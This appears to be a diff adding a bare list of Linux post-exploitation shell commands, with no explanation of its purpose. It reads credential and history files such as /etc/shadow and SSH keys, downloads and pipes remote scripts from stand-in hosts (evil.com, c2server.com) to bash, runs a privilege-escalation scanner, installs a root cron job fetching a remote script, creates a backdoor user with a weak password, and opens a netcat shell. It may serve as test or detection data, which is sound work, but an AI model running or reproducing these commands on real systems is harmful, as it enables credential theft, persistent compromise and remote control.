@@ -1,0 +1,13 @@
+cat /etc/passwd
+cat /etc/shadow
+cat /root/.bash_history
+cat /home/user/.ssh/authorized_keys
+cat /home/user/.bash_history
+wget http://evil.com/shell.sh
+curl -s http://c2server.com/payload | bash
+chmod +x /home/user/downloads/linpeas.sh
+/home/user/downloads/linpeas.sh
+echo "* * * * * root curl http://evil.com/c2.sh | bash" >> /etc/crontab
+useradd -m -s /bin/bash backdoor
+echo "backdoor:password123" | chpasswd
+nc -lvnp 4444 -e /bin/bash
